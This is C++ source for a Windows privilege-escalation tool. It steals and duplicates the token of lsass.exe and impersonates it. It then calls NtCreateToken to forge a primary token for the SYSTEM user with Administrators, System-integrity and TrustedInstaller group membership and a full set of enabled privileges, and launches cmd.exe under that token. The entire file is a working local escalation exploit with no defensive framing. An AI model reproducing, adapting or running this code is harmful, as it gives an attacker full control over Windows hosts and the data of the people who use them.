#include <windows.h>
#include <TlHelp32.h>
#include <wininet.h>
#include <iostream>
#include <sddl.h>
#include "priv.h"

LUID LookupPriv(const wchar_t* priv) {
    LUID luid;
    if (LookupPrivilegeValueW(NULL, priv, &luid)) {
        return luid;
    }
    
}
DWORD FindProc(const wchar_t* process) {
    HANDLE snap;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        if (Process32First(snap, &pe32)) {
            do {
                if (wcscmp(pe32.szExeFile, process) == 0) {
                    return pe32.th32ProcessID;
                }
                    
            } while (Process32Next(snap, &pe32));
        }
    }
}
HANDLE GetToken(DWORD pid) {
    HANDLE hProcess;
    HANDLE hToken;
    HANDLE hDupToken;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    RtlZeroMemory(&si, sizeof(si));
    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
    if (hProcess != NULL) {
        if (OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken)) {
            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                return hDupToken;
            }
          

        }
        
    }
}

VOID CreateToken() {
    HMODULE ntdll;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    WCHAR cmd[] = L"C:\\windows\\system32\\cmd.exe";
    LUID luid;
    LUID sedebug;
    LUID seimpersonate;
    HANDLE token = NULL;

    TOKEN_USER tokenuser;
    TOKEN_OWNER tokenowner;
    TOKEN_PRIMARY_GROUP tokenpgroup;

    PTOKEN_GROUPS tokengroup = NULL;
    PTOKEN_PRIVILEGES tokenpriv = NULL;
    PTOKEN_DEFAULT_DACL tokendacl = NULL;
    PTOKEN_SOURCE tokensource = NULL;
    SID_AND_ATTRIBUTES saa;
    PSID pSYSTEMSID = NULL;
    PSID pAUTH = NULL;
    PSID pLOCALADM = NULL;
    PSID pEVERYONE = NULL;
    PSID pSYS = NULL;
    PSID pTrusted = NULL;
    CHAR source[] = "seclogon";
    LARGE_INTEGER exp;
    LUID lluid = SYSTEM_LUID;
    NTSTATUS status;
    exp.QuadPart = -1;
    RtlZeroMemory(&si, sizeof(si));
    
    ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll == NULL) {
        exit(0);
    }
    _NtCreateToken NtCreateToken = (_NtCreateToken)GetProcAddress(ntdll, "NtCreateToken");
    _NtAllocateLocallyUniqueId NtAllocateLocallyUniqueId = (_NtAllocateLocallyUniqueId)GetProcAddress(ntdll, "NtAllocateLocallyUniqueId");
   
    SECURITY_QUALITY_OF_SERVICE sqs = { sizeof(sqs),SecurityAnonymous,SECURITY_STATIC_TRACKING,FALSE};
    OBJECT_ATTRIBUTES oa ={ sizeof(oa),NULL,NULL,0,NULL,&sqs};

    
    
   
    if (NtCreateToken == NULL || NtAllocateLocallyUniqueId == NULL) {
        exit(0);
    }
    NtAllocateLocallyUniqueId(&luid);

    // Create SID's 

    if (!ConvertStringSidToSidW(L"S-1-5-18", &pSYSTEMSID)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-5-32-544", &pLOCALADM)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
   }
  
    if (!ConvertStringSidToSidW(L"S-1-5-11", &pAUTH)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-1-0", &pEVERYONE)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-16-16384", &pSYS)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    if (!ConvertStringSidToSidW(L"S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", &pTrusted)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
    

    
    
  
    //Set user 
    tokenuser.User.Sid = pSYSTEMSID;
    tokenuser.User.Attributes = 0;

    // Set groups
    tokengroup = (PTOKEN_GROUPS)GlobalAlloc(GPTR, sizeof(TOKEN_GROUPS) + (sizeof(SID_AND_ATTRIBUTES) * GROUPCOUNT));
    if (tokengroup == NULL) {
        goto cleanup;
    }
    tokengroup->GroupCount = GROUPCOUNT;
    tokengroup->Groups[0].Sid = pLOCALADM;
    tokengroup->Groups[0].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY|SE_GROUP_OWNER;
    tokengroup->Groups[1].Sid = pAUTH;
    tokengroup->Groups[1].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
    tokengroup->Groups[2].Sid = pEVERYONE;
    tokengroup->Groups[2].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
    tokengroup->Groups[3].Sid = pSYS;
    tokengroup->Groups[3].Attributes = SE_GROUP_INTEGRITY| SE_GROUP_INTEGRITY_ENABLED;
    tokengroup->Groups[4].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY | SE_GROUP_OWNER;
    tokengroup->Groups[4].Sid = pTrusted;
 
    // Add privileges
    tokenpriv = (PTOKEN_PRIVILEGES)GlobalAlloc(GPTR, sizeof(PTOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES)*PRIVCOUNT));
    if (tokenpriv == NULL) {
        goto cleanup;
    }
    tokenpriv->PrivilegeCount = PRIVCOUNT;
    
    for (int i = 0; i < tokenpriv->PrivilegeCount; i++) {
       
        tokenpriv->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
        tokenpriv->Privileges[i].Luid = LookupPriv(privs[i]);
    }
    
    tokenowner.Owner = pLOCALADM;
    tokenpgroup.PrimaryGroup = pLOCALADM;
    tokendacl = (PTOKEN_DEFAULT_DACL)GlobalAlloc(GPTR, sizeof(PTOKEN_DEFAULT_DACL));
   
    tokensource = (PTOKEN_SOURCE)GlobalAlloc(GPTR, sizeof(TOKEN_SOURCE));
    if (tokensource == NULL) {
        goto cleanup;
    }
    tokensource->SourceIdentifier = luid;
    memcpy(tokensource->SourceName, source, 8);

    status = NtCreateToken(&token, TOKEN_ALL_ACCESS, &oa, TokenPrimary, &lluid, &exp, &tokenuser, tokengroup, tokenpriv, &tokenowner, &tokenpgroup, tokendacl, tokensource);
    if (status != 0) {
        printf("Error: %d\n", status);
        goto cleanup;
     }
    if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, cmd, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("Error: %d\n", GetLastError());
        goto cleanup;
    }
cleanup:
    LocalFree(pSYSTEMSID);
    LocalFree(pAUTH);
    LocalFree(pLOCALADM);
    LocalFree(pEVERYONE);
    LocalFree(pSYS);
    LocalFree(pTrusted);
    GlobalFree(tokendacl);
    GlobalFree(tokensource);
    GlobalFree(tokenpriv);
    GlobalFree(tokengroup);
    exit(0);
}
int wmain()
{
    HANDLE token = NULL;
    token = GetToken(FindProc(L"lsass.exe"));
    if (token != NULL) {
        if (ImpersonateLoggedOnUser(token)) {CreateToken(); }
    }
}
